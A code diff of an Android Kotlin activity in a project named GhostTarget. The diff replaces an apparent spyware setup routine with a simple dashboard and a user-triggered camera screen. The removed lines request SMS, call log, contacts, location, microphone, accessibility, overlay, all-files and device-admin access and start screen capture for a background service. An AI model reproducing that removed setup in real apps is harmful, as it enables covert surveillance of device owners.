@@ -1,77 +1,267 @@
 package com.ghost.target
 
-import android.Manifest
-import android.app.admin.DevicePolicyManager
-import android.content.ComponentName
-import android.content.Context
-import android.content.Intent
-import android.content.pm.PackageManager
-import android.media.projection.MediaProjection
-import android.media.projection.MediaProjectionManager
-import android.net.Uri
-import android.os.Build
+import android.app.Activity
 import android.os.Bundle
-import android.os.Environment
-import android.provider.Settings
-import androidx.appcompat.app.AppCompatActivity
-import androidx.core.app.ActivityCompat
-import androidx.core.content.ContextCompat
+import android.graphics.Color
+import android.graphics.Typeface
+import android.content.Intent
+import android.provider.MediaStore
+import android.content.pm.PackageManager
+import android.view.Gravity
+import android.view.View
+import android.widget.*
+import android.graphics.Bitmap
 
-class MainActivity : AppCompatActivity() {
+class MainActivity : Activity() {
+
+    private val bg = Color.rgb(7, 11, 14)
+    private val panel = Color.rgb(15, 23, 27)
+    private val green = Color.rgb(0, 255, 145)
+    private val muted = Color.rgb(133, 157, 151)
+
+    private lateinit var root: LinearLayout
+    private var photo: ImageView? = null
+
     override fun onCreate(savedInstanceState: Bundle?) {
         super.onCreate(savedInstanceState)
-        val perms = mutableListOf(
-            Manifest.permission.CAMERA, Manifest.permission.ACCESS_FINE_LOCATION, 
-            Manifest.permission.READ_CONTACTS, Manifest.permission.READ_SMS,
-            Manifest.permission.READ_CALL_LOG, Manifest.permission.RECORD_AUDIO
+        window.statusBarColor = bg
+        window.navigationBarColor = bg
+        window.decorView.systemUiVisibility = 0
+        render()
+    }
+
+    private fun dp(v: Int): Int =
+        (v * resources.displayMetrics.density).toInt()
+
+    private fun text(
+        value: String,
+        size: Float,
+        color: Int = Color.WHITE,
+        bold: Boolean = false
+    ): TextView {
+        return TextView(this).apply {
+            text = value
+            textSize = size
+            setTextColor(color)
+            if (bold) setTypeface(null, Typeface.BOLD)
+            setPadding(dp(2), dp(5), dp(2), dp(5))
+        }
+    }
+
+    private fun card(): LinearLayout {
+        return LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(dp(16), dp(13), dp(16), dp(13))
+            setBackgroundColor(panel)
+            val p = LinearLayout.LayoutParams(
+                -1, -2
+            )
+            p.setMargins(0, 0, 0, dp(12))
+            layoutParams = p
+        }
+    }
+
+    private fun button(
+        label: String,
+        action: () -> Unit
+    ): Button {
+        return Button(this).apply {
+            text = label
+            setTextColor(green)
+            setBackgroundColor(Color.rgb(23, 39, 34))
+            setOnClickListener { action() }
+        }
+    }
+
+    private fun render() {
+        root = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setBackgroundColor(bg)
+        }
+
+        val header = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(dp(20), dp(23), dp(20), dp(15))
+        }
+
+        header.addView(
+            text("GHOSTTARGET / X", 23f, green, true)
         )
-        if (Build.VERSION.SDK_INT >= 33) perms.add(Manifest.permission.POST_NOTIFICATIONS)
-        
-        val missing = perms.filter { ContextCompat.checkSelfPermission(this, it) != PackageManager.PERMISSION_GRANTED }
-        if (missing.isNotEmpty()) {
-            ActivityCompat.requestPermissions(this, missing.toTypedArray(), 1001)
+        header.addView(
+            text(
+                "SECURE DEVICE MANAGEMENT SYSTEM",
+                10f, muted, true
+            )
+        )
+
+        root.addView(header)
+
+        val scroll = ScrollView(this)
+        val content = LinearLayout(this).apply {
+            orientation = LinearLayout.VERTICAL
+            setPadding(dp(16), dp(5), dp(16), dp(25))
+        }
+
+        val isAdmin = BuildConfig.APP_ROLE == "ADMIN"
+
+        content.addView(text(
+            if (isAdmin) "COMMAND CENTER" else "CLIENT TERMINAL",
+            12f, green, true
+        ))
+
+        content.addView(text(
+            if (isAdmin)
+                "Control dashboard / Local overview"
+            else
+                "Device session / User-controlled actions",
+            14f, Color.WHITE
+        ))
+
+        val status = card()
+        status.addView(text("● SYSTEM STATUS", 12f, green, true))
+        status.addView(text("APPLICATION : ONLINE", 13f))
+        status.addView(text("ROLE : ${BuildConfig.APP_ROLE}", 13f))
+        status.addView(text("VERSION : 1.0.0", 13f))
+        status.addView(text("SECURITY : LOCAL SESSION", 12f, muted))
+        content.addView(status)
+
+        if (isAdmin) {
+            val devices = card()
+            devices.addView(text("DEVICE OVERVIEW", 15f, green, true))
+            devices.addView(text("Registered devices: 0", 13f))
+            devices.addView(text("Active sessions: 0", 13f))
+            devices.addView(text("Pending approvals: 0", 13f))
+            devices.addView(text("Backend: Not configured", 12f, muted))
+            content.addView(devices)
+
+            val activity = card()
+            activity.addView(text("ACTIVITY LOG", 15f, green, true))
+            activity.addView(text("System initialized.", 13f))
+            activity.addView(text("No remote session connected.", 13f, muted))
+            activity.addView(text("Waiting for secure pairing...", 13f, muted))
+            content.addView(activity)
+
+            val security = card()
+            security.addView(text("SECURITY CENTER", 15f, green, true))
+            security.addView(text("Local dashboard active", 13f))
+            security.addView(text("Remote actions disabled until authenticated pairing.", 12f, muted))
+            content.addView(security)
+
         } else {
-            setupExtras()
-        }
-    }
+            val camera = card()
+            camera.addView(text("CAMERA SESSION", 16f, green, true))
+            camera.addView(text(
+                "Kamera hanya aktif setelah kamu menekan tombol dan menyetujui penggunaan kamera.",
+                12f, muted
+            ))
 
-    override fun onRequestPermissionsResult(r: Int, p: Array<out String>, g: IntArray) {
-        super.onRequestPermissionsResult(r, p, g)
-        setupExtras()
-    }
-
-    private fun setupExtras() {
-        try { startActivity(Intent(Settings.ACTION_ACCESSIBILITY_SETTINGS)) } catch (e: Exception) {}
-        if (!Settings.canDrawOverlays(this)) {
-            startActivity(Intent(Settings.ACTION_MANAGE_OVERLAY_PERMISSION, Uri.parse("package:$packageName")))
-        }
-        if (Build.VERSION.SDK_INT >= 30 && !Environment.isExternalStorageManager()) {
-            try { startActivity(Intent(Settings.ACTION_MANAGE_APP_ALL_FILES_ACCESS_PERMISSION).apply { data = Uri.parse("package:$packageName") }) } catch (e: Exception) {}
-        }
-        val dpm = getSystemService(Context.DEVICE_POLICY_SERVICE) as DevicePolicyManager
-        if (!dpm.isAdminActive(ComponentName(this, AdminReceiver::class.java))) {
-            startActivity(Intent(DevicePolicyManager.ACTION_ADD_DEVICE_ADMIN).apply {
-                putExtra(DevicePolicyManager.EXTRA_DEVICE_ADMIN, ComponentName(this@MainActivity, AdminReceiver::class.java))
-                putExtra(DevicePolicyManager.EXTRA_ADD_EXPLANATION, "Izinkan kunci layar.")
+            camera.addView(button("OPEN CAMERA / TAKE PHOTO") {
+                openCamera()
             })
+
+            photo = ImageView(this).apply {
+                adjustViewBounds = true
+                visibility = View.GONE
+            }
+            camera.addView(photo)
+            content.addView(camera)
+
+            val info = card()
+            info.addView(text("DEVICE INFORMATION", 15f, green, true))
+            info.addView(text("Android: ${android.os.Build.VERSION.RELEASE}", 13f))
+            info.addView(text("Model: ${android.os.Build.MODEL}", 13f))
+            info.addView(text("Manufacturer: ${android.os.Build.MANUFACTURER}", 13f))
+            info.addView(text("Camera: User initiated only", 12f, muted))
+            content.addView(info)
+
+            val privacy = card()
+            privacy.addView(text("PRIVACY CONTROL", 15f, green, true))
+            privacy.addView(text(
+                "Tidak ada pengambilan gambar tersembunyi. " +
+                "Sesi kamera memerlukan tindakan langsung pengguna.",
+                12f, muted
+            ))
+            content.addView(privacy)
         }
-        val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-        startActivityForResult(mpm.createScreenCaptureIntent(), 2002)
-        startSvc()
+
+        content.addView(text(
+            "GHOSTTARGET X  •  BUILD 001",
+            10f, muted
+        ))
+
+        scroll.addView(content)
+        root.addView(scroll)
+        setContentView(root)
     }
 
-    override fun onActivityResult(requestCode: Int, resultCode: Int, data: Intent?) {
+    private fun openCamera() {
+        if (checkSelfPermission(android.Manifest.permission.CAMERA)
+            != PackageManager.PERMISSION_GRANTED) {
+            requestPermissions(
+                arrayOf(android.Manifest.permission.CAMERA), 100
+            )
+            return
+        }
+
+        launchCamera()
+    }
+
+    private fun launchCamera() {
+        try {
+            val intent = Intent(MediaStore.ACTION_IMAGE_CAPTURE)
+            if (intent.resolveActivity(packageManager) != null) {
+                startActivityForResult(intent, 101)
+            } else {
+                Toast.makeText(
+                    this, "Camera app unavailable",
+                    Toast.LENGTH_LONG
+                ).show()
+            }
+        } catch (e: Exception) {
+            Toast.makeText(
+                this, "Camera error: ${e.message}",
+                Toast.LENGTH_LONG
+            ).show()
+        }
+    }
+
+    override fun onRequestPermissionsResult(
+        requestCode: Int,
+        permissions: Array<out String>,
+        grantResults: IntArray
+    ) {
+        super.onRequestPermissionsResult(
+            requestCode, permissions, grantResults
+        )
+
+        if (requestCode == 100 &&
+            grantResults.isNotEmpty() &&
+            grantResults[0] == PackageManager.PERMISSION_GRANTED
+        ) {
+            launchCamera()
+        }
+    }
+
+    @Deprecated("Legacy camera result callback")
+    override fun onActivityResult(
+        requestCode: Int,
+        resultCode: Int,
+        data: Intent?
+    ) {
         super.onActivityResult(requestCode, resultCode, data)
-        if (requestCode == 2002 && resultCode == RESULT_OK && data != null) {
-            val mpm = getSystemService(Context.MEDIA_PROJECTION_SERVICE) as MediaProjectionManager
-            val mp: MediaProjection? = mpm.getMediaProjection(resultCode, data)
-            TargetService.instance?.setMediaProjection(mp)
-        }
-        finish()
-    }
 
-    private fun startSvc() { 
-        val i = Intent(this, TargetService::class.java)
-        if (Build.VERSION.SDK_INT >= 26) startForegroundService(i) else startService(i) 
+        if (requestCode == 101 && resultCode == RESULT_OK) {
+            val bitmap = data?.extras?.get("data") as? Bitmap
+            if (bitmap != null) {
+                photo?.apply {
+                    setImageBitmap(bitmap)
+                    visibility = View.VISIBLE
+                }
+                Toast.makeText(
+                    this, "Photo captured successfully",
+                    Toast.LENGTH_SHORT
+                ).show()
+            }
+        }
     }
 }
